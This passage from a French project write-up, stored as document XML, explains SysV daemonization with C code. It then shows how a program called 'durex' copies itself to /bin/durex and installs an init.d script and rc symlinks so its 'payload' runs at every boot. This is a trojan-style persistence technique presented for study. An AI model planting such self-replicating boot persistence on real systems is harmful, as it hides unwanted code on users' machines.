      <text:p text:style-name="P7"><text:span text:style-name="T9">Sachant cela, voici les différentes étapes suivies par un programme qui souhaite devenir un daemon (toujours en </text:span><text:span text:style-name="T7">old-style</text:span><text:span text:style-name="T9">, traditional SysV daemons) :</text:span></text:p>
      <text:p text:style-name="P52"/>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header-rows>
          <table:table-row>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Step</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">PPID</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">PID</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">PGID</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">SID</text:p>
            </table:table-cell>
            <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
              <text:p text:style-name="Table_20_Heading">Comments</text:p>
            </table:table-cell>
          </table:table-row>
        </table:table-header-rows>
        <table:table-row>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">0</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">4444</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">301</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">301</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">300</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="P20">Before first fork.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">301</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">300</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="P21">After first fork.</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">2</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="P21">After setsid().</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">3</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">1</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">303</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="Table_20_Contents">302</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Tableau1.A1" office:value-type="string">
            <text:p text:style-name="P21">After second fork.</text:p>
          </table:table-cell>
        </table:table-row>
      </table:table>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">&gt; </text:span><text:span text:style-name="T12">Step 0</text:span><text:span text:style-name="T9"> : On a ici affaire à un processus assez classique. La session 300 représente la session de l'utilisateur qui a lancé le processus. Le processus a un PPID de 4444, typiquement celui de la shell qui l'a lancé (et qui appartient également à la session de l'utilisateur).</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">&gt; </text:span><text:span text:style-name="T12">Step 1</text:span><text:span text:style-name="T9"> : On a effectué le </text:span><text:span text:style-name="T10">premier fork</text:span><text:span text:style-name="T9">, et on a </text:span><text:span text:style-name="T10">fait exit le parent</text:span><text:span text:style-name="T9">. Notre processus est désormais </text:span><text:span text:style-name="T7">orphaned</text:span><text:span text:style-name="T9">, c'est-à-dire que son processus parent est </text:span><text:span text:style-name="T10">init</text:span><text:span text:style-name="T9"> (PPID = 1), et il tourne en arrière-plan. Le problème est qu'il fait toujours partie de la session de l'utilisateur : si ce dernier se log out, notre programme va quitter, ce qu'on veut éviter. De même, tous les processus appartenant à une même session partagent un </text:span><text:span text:style-name="T10">controlling terminal</text:span><text:span text:style-name="T9">, et on ne veut pas de terminal associé à notre processus pour éviter de pouvoir lui envoyer des données via </text:span><text:span text:style-name="T7">stdin</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">&gt; </text:span><text:span text:style-name="T12">Step 2</text:span><text:span text:style-name="T9"> : L'appel à </text:span><text:span text:style-name="T10">setsid()</text:span><text:span text:style-name="T9"> sans argument permet de </text:span><text:span text:style-name="T10">créer une nouvelle session</text:span><text:span text:style-name="T9">, avec </text:span><text:span text:style-name="T10">un seul process group</text:span><text:span text:style-name="T9">, lui-même contenant uniquement notre processus actuel. Si l'utilisateur se log out, notre processus continuera bien de tourner. De même, la </text:span><text:span text:style-name="T10">nouvelle session est créée sans controlling terminal</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P7"><text:soft-page-break/><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man2/setsid.2.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://man7.org/linux/man-pages/man2/setsid.2.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P7"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man7/credentials.7.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://man7.org/linux/man-pages/man7/credentials.7.html</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">&gt; </text:span><text:span text:style-name="T12">Step 3</text:span><text:span text:style-name="T9"> : On effectue enfin un dernier appel à </text:span><text:span text:style-name="T10">fork()</text:span><text:span text:style-name="T9">. Ce second fork est présent afin d'éviter que notre daemon ne puisse </text:span><text:span text:style-name="T10">récupèrer</text:span><text:span text:style-name="T9"> un terminal :</text:span></text:p>
      <text:p text:style-name="P52"/>
      <text:p text:style-name="P7"><text:span text:style-name="T9">"...</text:span><text:span text:style-name="T7"> to ensure that the daemon can never re-acquire a terminal again. This relevant if the program — and all its dependencies — does not carefully specify `O_NOCTTY` on each and every single `open()` call that might potentially open a TTY device node.</text:span><text:span text:style-name="T9">"</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">En effet, le man <text:span text:style-name="T6">credentials</text:span> nous informe que lorsqu'un <text:span text:style-name="T6">leader de session</text:span> ouvre pour la première fois un terminal (sans préciser O_NOCTTY), ce terminal devient le <text:span text:style-name="T7">controlling terminal</text:span><text:span text:style-name="T9"> de la session, et donc de notre programme qu'on souhaite faire tourner en tant que </text:span><text:span text:style-name="T7">daemon</text:span><text:span text:style-name="T9">, ce qu'on veut éviter. Le second </text:span><text:span text:style-name="T10">fork</text:span><text:span text:style-name="T9"> (et l'exit du parent) permet de donner un nouveau PID au programme et faire en sortes qu'il </text:span><text:span text:style-name="T10">ne</text:span><text:span text:style-name="T9"> </text:span><text:span text:style-name="T10">soit plus un leader de session</text:span><text:span text:style-name="T9"> pouvant définir par inadvertance un </text:span><text:span text:style-name="T7">controlling terminal</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P3"><text:span text:style-name="T9">Une fois cet enchaînement (</text:span><text:span text:style-name="T10">fork, setsid, fork</text:span><text:span text:style-name="T9">) effectué, on a un programme d'arrière-plan, avec une session indépendante, et sans aucune possibilité d'acquérir un terminal. Il reste deux étapes à effectuer</text:span><text:span text:style-name="T9"><text:note text:id="ftn1" text:note-class="footnote"><text:note-citation>1</text:note-citation><text:note-body><text:p text:style-name="P19"><text:s/>: Dans la documentation <text:span text:style-name="T6">daemon</text:span><text:span text:style-name="T13">, quelques étapes supplémentaires sont précisées, mais on va ici au plus simple.</text:span></text:p></text:note-body></text:note></text:span><text:span text:style-name="T9"> :</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T6">Fermer l'intégralité des file descriptors</text:span> du programme (y compris stdin, stdout, stderr).</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">&gt; Reset le </text:span><text:span text:style-name="T6">umask</text:span><text:span text:style-name="T13"> du programme à 0. Umask contrôle les droits d'accès par défaut donnés aux fichiers créés par un programme, on remet tout ça à 0, "</text:span><text:span text:style-name="T7">so that the file modes passed to </text:span><text:span text:style-name="T5">open()</text:span>, <text:span text:style-name="T5">mkdir() </text:span><text:span text:style-name="T7">and suchlike directly control the access mode of the created files and directories.</text:span>"</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; On change le current directory vers '<text:span text:style-name="T1">/</text:span>', "<text:span text:style-name="T7">in order to avoid that the daemon involuntarily blocks mount points from being unmounted</text:span>".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Voici donc notre fonction de daemonisation, qui implémente ces différentes étapes :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P15"><text:span text:style-name="T15">void</text:span> <text:s text:c="3"/><text:span text:style-name="T16">daemonize</text:span><text:span text:style-name="T17">(</text:span><text:span text:style-name="T15">void</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P16">{</text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T15">pid_t</text:span> <text:s text:c="6"/><text:span text:style-name="T17">pid;</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// FIRST FORK</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">pid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">fork();</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">&gt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span> <text:s text:c="7"/><text:span text:style-name="T18">// (exit parent)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// SET SESSION</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(setsid()</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// SECOND FORK</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">pid</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">fork();</text:span></text:p>
      <text:p text:style-name="P17"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">&lt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">1</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">if</text:span> <text:span text:style-name="T17">(pid</text:span> <text:span text:style-name="T17">&gt;</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">)</text:span> <text:s text:c="7"/><text:span text:style-name="T18">// (exit parent)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">exit(</text:span><text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// CLOSE ALL FILE DESCRIPTORS</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T19">for</text:span> <text:span text:style-name="T17">(</text:span><text:span text:style-name="T15">int</text:span> <text:span text:style-name="T17">x</text:span> <text:span text:style-name="T17">=</text:span> <text:span text:style-name="T17">sysconf(_SC_OPEN_MAX);</text:span> <text:span text:style-name="T17">x</text:span> <text:span text:style-name="T17">&gt;=</text:span> <text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">;</text:span> <text:span text:style-name="T17">x--)</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="8"/><text:span text:style-name="T17">close(x);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// RESET UMASK</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">umask(</text:span><text:span text:style-name="T20">0</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T18">// CHANGE DIRECTORY</text:span></text:p>
      <text:p text:style-name="P17"><text:s text:c="4"/><text:span text:style-name="T17">chdir(</text:span><text:span text:style-name="T21">"/"</text:span><text:span text:style-name="T17">);</text:span></text:p>
      <text:p text:style-name="P22">}</text:p>
      <text:p text:style-name="P30">Une fois que le programme a exécuté ces instructions, voici le résultat de la commande suivante :</text:p>
      <text:p text:style-name="P31">ps -w axo ppid,pid,pgid,sid,tty,tgpid,stat,user,cmd | grep durex</text:p>
      <text:p text:style-name="P30"><draw:frame draw:style-name="fr2" draw:name="images2" text:anchor-type="paragraph" svg:width="16.999cm" svg:height="1.281cm" draw:z-index="1"><draw:image xlink:href="Pictures/20000007000045DF0000054630532261.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P75"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">Maintenant que nous y voyons un peu plus clair sur la façon de créer manuellement des daemons, revenons à </text:span><text:span text:style-name="T6">Durex </text:span><text:span text:style-name="T13">et son implémentation </text:span><text:span text:style-name="T8">old-style</text:span><text:span text:style-name="T11">. Pour lancer un daemon </text:span><text:span text:style-name="T8">old-style </text:span><text:span text:style-name="T11">au démarrage, le man7 daemon nous indique :</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T11">"</text:span><text:span text:style-name="T8">Old-style daemons are usually activated exclusively on boot (and </text:span><text:span text:style-name="T7">manually by the administrator) via SysV init scripts</text:span><text:span text:style-name="T13">".</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">Les scripts d'initialisation SysV ne sont rien d'autre que des scripts shell, placés dans le folder </text:span><text:span text:style-name="T6">/etc/init.d</text:span><text:span text:style-name="T13">, qui spécifient un certain nombre d'actions à effectuer pour lancer un programme (souvent un daemon). Ces scripts sont lancés au boot de la machine en plaçant un lien symbolique qui y font référence dans les dossiers </text:span><text:span text:style-name="T6">/etc/rc*.d</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Résumons. Notre programme originel durex va devoir :</text:p>
      <text:list xml:id="list829566325761211522" text:style-name="L6">
        <text:list-item>
          <text:p text:style-name="P69"><text:span text:style-name="T13">S'auto-répliquer dans </text:span><text:span text:style-name="T6">/bin/durex</text:span><text:span text:style-name="T13">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P69"><text:span text:style-name="T13">Écrire un </text:span><text:span text:style-name="T6">script init.d</text:span><text:span text:style-name="T13"> permettant son lancement.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P69"><text:span text:style-name="T13">Créer les symlinks vers </text:span><text:span text:style-name="T6">/etc/rc*.d</text:span><text:span text:style-name="T13"> pour un lancement au boot.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P42">Lancer le daemon.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">Lorsque le programme </text:span><text:span text:style-name="T6">/bin/durex</text:span><text:span text:style-name="T13"> est lancé suite à l'auto-réplication et la création du script init, ou au boot de la machine, il ne faut pas qu'il réplique à chaque fois les étapes d'auto-réplication et de création de script init ! Lorsqu'il se lance ainsi, ces étapes ont déjà été effectuées. C'est pourquoi, lorsque le programme est lancé avec l'argument de ligne de commande </text:span><text:span text:style-name="T6">daemon</text:span><text:span text:style-name="T13">, il sautera les étapes de setup et de configuration pour partir directement sur son payload.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">Le script </text:span><text:span text:style-name="T6">init.d</text:span><text:span text:style-name="T13"> lance le programme </text:span><text:span text:style-name="T6">/bin/durex</text:span><text:span text:style-name="T13"> avec cet argument de ligne de commande, or c'est lui qui est utilisé pour lancer le programme au boot, et suite à l'exécution du programme originel, ce qui règle notre problème (voir </text:span><text:span text:style-name="T6">durex.c</text:span><text:span text:style-name="T13">, fonction main).</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:list xml:id="list7016883852700981424" text:style-name="L7">
        <text:list-item>
          <text:p text:style-name="P36"><text:soft-page-break/>Setup et configuration</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">Lorsque le binaire </text:span><text:span text:style-name="T6">durex</text:span><text:span text:style-name="T13"> originel est lancé, la première phase est donc une auto-réplication, une écriture du script </text:span><text:span text:style-name="T2">init.d</text:span><text:span text:style-name="T13"> et le link aux dossiers </text:span><text:span text:style-name="T2">/etc/rc*.d</text:span><text:span text:style-name="T13">. Ces différentes actions sont effectuées dans </text:span><text:span text:style-name="T6">durex_bin.c</text:span><text:span text:style-name="T13">.</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">L'auto-réplication utilise un </text:span><text:span text:style-name="T6">readlink /proc/self/exe</text:span><text:span text:style-name="T13">, qui est un fichier qui contient un lien symbolique vers l'exécutable actuel. Grâce à </text:span><text:span text:style-name="T6">readlink</text:span><text:span text:style-name="T13">, on récupère donc le path de notre exécutable </text:span><text:span text:style-name="T6">durex</text:span><text:span text:style-name="T13"> originel, on l'ouvre en lecture (ce qu'on peut faire, même s'il est en cours d'exécution), et on le copie entièrement vers </text:span><text:span text:style-name="T6">/bin/durex</text:span><text:span text:style-name="T13"> (avec un mmap et un write).</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P8"><text:span text:style-name="T13">L'écriture du script </text:span><text:span text:style-name="T6">init.d</text:span><text:span text:style-name="T13"> est assez simple (un open, un write d'un contenu hardcodé), et aboutit à l'écriture du fichier suivant :</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">#! /bin/bash</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">### BEGIN INIT INFO</text:p>
      <text:p text:style-name="P5"># Provides:<text:tab/><text:tab/>durex</text:p>
      <text:p text:style-name="P5"># Required-start:<text:tab/>$local_fs</text:p>
      <text:p text:style-name="P5"># Required-stop:<text:tab/><text:tab/>$local_fs</text:p>
      <text:p text:style-name="P5"># Default-Start:<text:tab/><text:tab/>2 3 4 5</text:p>
      <text:p text:style-name="P5"># Default-Stop:<text:tab/><text:tab/>0 1 6</text:p>
      <text:p text:style-name="P5"># Short-Description:<text:tab/>durex</text:p>
      <text:p text:style-name="P5"># Description:<text:tab/><text:tab/>durex</text:p>
      <text:p text:style-name="P5">### END INIT INFO</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">/bin/sh -c "/bin/./durex daemon"</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Ce script <text:span text:style-name="T6">init.d</text:span> n'a pas vraiment le format requis, les actions requises (start, stop...), et est extrêmement rudimentaire : il se contente de lancer notre binaire répliqué, en mode daemon uniquement. Cela suffira pour le moment. Pour un script basique plus complet :</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://gist.github.com/drmalex07/298ab26c06ecf401f66c" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://gist.github.com/drmalex07/298ab26c06ecf401f66c</text:a> </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Le header entre <text:span text:style-name="T1">BEGIN INIT INFO</text:span> et <text:span text:style-name="T1">END INIT INFO</text:span> contient des informations utilisées par <text:span text:style-name="T6">init.d</text:span>.</text:p>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T1">Required-start</text:span> et <text:span text:style-name="T1">Required-stop</text:span> : indiquent ce dont on a besoin pour lancer le script, ici on a besoin au minimum du filesystem.</text:p>
      <text:p text:style-name="P3">&gt; <text:span text:style-name="T1">Default-start</text:span> et <text:span text:style-name="T1">Default-stop</text:span> : indiquent les runlevels auxquels le script devra lancer ou arrêter le programme cible. Les chiffres correspondent aux <text:span text:style-name="T6">runlevels</text:span>, et seront utilisés ensuite par <text:span text:style-name="T6">update-rc.d</text:span> (voir ci-dessous). J'ai laissé les valeurs standards pour le lancement d'un script au boot, voici les différents runlevels qui existent :</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://searchdatacenter.techtarget.com/definition/runlevel" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://searchdatacenter.techtarget.com/definition/runlevel</text:a> </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Notre script <text:span text:style-name="T6">init.d</text:span> est en place. Créons maintenant les symlinks dans les dossiers /etc/rc*.d. Il existe un dossier pour chaque runlevel (<text:span text:style-name="T1">/etc/rc0.d</text:span>, <text:span text:style-name="T1">/etc/rc1.d</text:span>, <text:span text:style-name="T1">/etc/rc2.d</text:span> etc...). </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">"<text:span text:style-name="T7">Runlevels are implemented as directories on the system which contain shell scripts to start and stop specific daemons, e.g. /etc/rc1.d/. Most systems have directories for runlevels 0-6.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">The scripts within each directory are named with either a capital S, or a capital K, followed by a two-digit number, followed by the name of the service being referenced. The files beginning with <text:soft-page-break/>capital S represent scripts which are started upon entering that runlevel, while files beginning with capital K represent scripts which are stopped. The numbers specify the order in which the scripts should be executed.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P3"><text:span text:style-name="T7">For example, a daemon might have a script named S35daemon in rc3.d/, and a script named K65daemon to stop it in rc2.d/. Having the numbers at the beginning of the file name causes them to sort, and be processed, in the desired order</text:span>".</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour créer les symlinks appropriés, la commande suivante s'occupe de tout (avec "<text:span text:style-name="T6">durex</text:span>" le nom du script init.d) :</text:p>
      <text:p text:style-name="P4">update-rc.d durex default</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P12"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Il va donc falloir qu'on fasse exécuter des commandes système à notre programme (c'est également essentiel pour les autres implémentations d'ailleurs). On pourrait y aller de manière très sale, en appelant <text:span text:style-name="T6">system</text:span>. Mais l'utilisation de cette fonction n'est vraiment pas conseillée. Elle n'est pas sécurisée, inefficace ...</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On a donc implémenté quelques fonctions, dans <text:span text:style-name="T6">cmd.c</text:span>, qui permettent d'appeler des commandes système de manière efficace et sécurisée.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">&gt; Avant toute chose, au début du programme, la fonction <text:span text:style-name="T6">clear_env() </text:span>du fichier <text:span text:style-name="T6">cmd.c</text:span> va permettre de réinitialiser entièrement l'environnement :</text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://wiki.sei.cmu.edu/confluence/display/c/ENV03-C.+Sanitize+the+environment+when+invoking+external+programs" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">Voir ce tutoriel.</text:a></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">La fonction elle-même est plutôt explicite. Elle appelle <text:span text:style-name="T6">clearenv()</text:span> (<text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man3/clearenv.3.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">man7</text:a>) pour vider entièrement l'environnement, puis <text:span text:style-name="T6">setenv()</text:span> afin de définir la variable <text:span text:style-name="T6">$PATH</text:span> manuellement. <text:span text:style-name="T9">On peut définir le PATH à partir de la variable _CS_PATH (path par défaut, </text:span><text:span text:style-name="T10">/bin:/usr/bin</text:span><text:span text:style-name="T9">), ou avec une valeur arbitraire. On utilise ici une valeur arbitraire, </text:span><text:span text:style-name="T10">/bin:/usr/bin:/usr/sbin</text:span><text:span text:style-name="T9">.</text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P3"><text:span text:style-name="T9">&gt; Ensuite, la fonction </text:span><text:span text:style-name="T10">exec_safe</text:span><text:span text:style-name="T9"> permet une simple exécution de commande, grâce à un fork et waitpid classique (on close STDOUT et STDERR dans le </text:span><text:span text:style-name="T7">child</text:span><text:span text:style-name="T9"> car on veut éviter d'avoir les retours des commandes dans ce programme, mais en général on peut les laisser).</text:span></text:p>
      <text:p text:style-name="P3"><text:a xlink:type="simple" xlink:href="https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T9">https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=87152177</text:span></text:a><text:span text:style-name="T9"> </text:span></text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P3"><text:span text:style-name="T9">&gt; La fonction </text:span><text:span text:style-name="T10">exec_safe_w_output</text:span><text:span text:style-name="T9"> est sensiblement similaire, mais utilise un </text:span><text:span text:style-name="T10">pipe</text:span><text:span text:style-name="T9"> afin de récupérer l'output du child process qui exécute la commande, et la stocker dans un buffer.</text:span></text:p>
      <text:p text:style-name="P6"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://stackoverflow.com/questions/7292642/grabbing-output-from-exec</text:a> </text:p>
      <text:p text:style-name="P74"/>
      <text:p text:style-name="P6"/>
